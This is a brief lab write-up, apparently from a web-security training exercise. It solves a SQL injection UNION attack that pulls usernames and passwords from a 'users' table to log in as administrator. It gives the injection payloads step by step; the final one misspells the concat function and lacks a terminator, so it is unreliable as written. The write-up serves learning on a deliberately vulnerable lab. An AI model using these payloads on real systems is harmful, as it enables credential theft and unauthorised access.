# Lab-10 SQL Injection

## SQL injection UNION attack, retrieving multiple values in a single column

### Problem

- This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

- The database contains a different table called `users`, with columns called `username and password`.

- To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

# Solution

- Goto => Product category and find the number of column:`'ORDER by 2--+`.

- Then use 'UNION SELECT' and find the column which we can retrive data.

```Sql
'UNION SELECT 'NULL','NULL'--+
'UNION SELECT NULL,'NULL' --+
-- After that we use concat function to enumurate the data
'UNION SELECT NULL,concate(username,':',password) from users
```
- Log in as `administrator`. 

- Lab solved!!!


